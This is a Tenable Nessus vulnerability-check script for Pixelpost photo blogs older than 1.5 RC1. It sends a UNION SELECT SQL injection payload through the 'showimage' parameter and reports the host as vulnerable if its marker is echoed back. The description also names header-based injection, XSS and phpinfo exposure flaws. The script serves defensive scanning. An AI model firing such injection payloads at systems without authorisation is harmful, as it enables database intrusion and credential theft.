#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21049);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-1104", "CVE-2006-1105", "CVE-2006-1106");
  script_bugtraq_id(16964);

  script_name(english:"Pixelpost < 1.5 RC1 Multiple Vulnerabilities");
  script_summary(english:"Tries to inject SQL code via Pixelpost's showimage parameter");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple vulnerabilities. 

Description :

The remote host is running Pixelpost, a photo blog application based
on PHP and MySQL. 

The version of Pixelpost installed on the remote host fails to
sanitize input to the 'showimage' parameter of the 'index.php' script
before using it to construct database queries.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated attacker
can exploit this flaw to inject arbitrary SQL code and thereby uncover
sensitive information such as authentication credentials, launch
attacks against the underlying database application, etc. 

In addition, the application reportedly contains a similar SQL
injection flaw involving the 'USER_AGENT', 'HTTP_REFERER' and
'HTTP_HOST' variables used in 'includes/functions.php', a cross-site
scripting issue involving the comment, name, url, and email values
when commenting on a post, and an information disclosure flaw
involving direct requests to 'includes/phpinfo.php'. 

See also :

http://www.securityfocus.com/archive/1/426764/30/0/threaded
http://forum.pixelpost.org/showthread.php?t=3535

Solution :

Upgrade to Pixelpost version 1.5 RC1 or later when it becomes
available. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/pixelpost", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to return some bogus info.
  magic = string(SCRIPT_NAME, "-", unixtime(), ".jpg");
  query = string(
    "UNION SELECT ", 
      "'", magic, "' as id, ", 
      rand(), " as headline, ",
      rand(), " as datetime, ",
      rand(), " as body, ",
      rand(), " as category, ",
      rand(), " as image"
  );

  req = http_get(
    item:string(
      dir, "/?",
      "showimage=", urlencode(str:string("') ", query)), "/*"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we get our "image" name back in a link.
  if (string('<a href="index.php?showimage=', magic) >< res)
  {
    security_warning(port);
    exit(0);
  }
}
